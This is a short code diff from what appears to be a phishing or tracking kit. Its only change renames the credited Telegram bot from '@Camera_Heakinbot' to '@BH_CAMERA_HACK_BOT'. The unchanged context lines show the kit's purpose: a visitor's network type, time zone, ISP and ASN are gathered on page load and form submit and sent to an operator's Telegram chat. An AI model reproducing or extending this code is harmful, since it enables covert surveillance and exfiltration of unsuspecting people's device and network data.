@@ -116,7 +116,7 @@ async function sendInitialInfo() {
 <b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
 <b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
 
-<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
+<b>👨‍💻 Tracked on: @BH_CAMERA_HACK_BOT</b>
 `;
 
     if (chatId) {
@@ -152,7 +152,7 @@ document.getElementById('data-form').addEventListener('submit', async function (
 <b>📡 ISP:</b> <i>${ipDetails.org}</i>
 <b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
 
-<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
+<b>👨‍💻 Tracked on: @BH_CAMERA_HACK_BOT</b>
 `;
 
     await sendTelegramMessage(chatId, message);
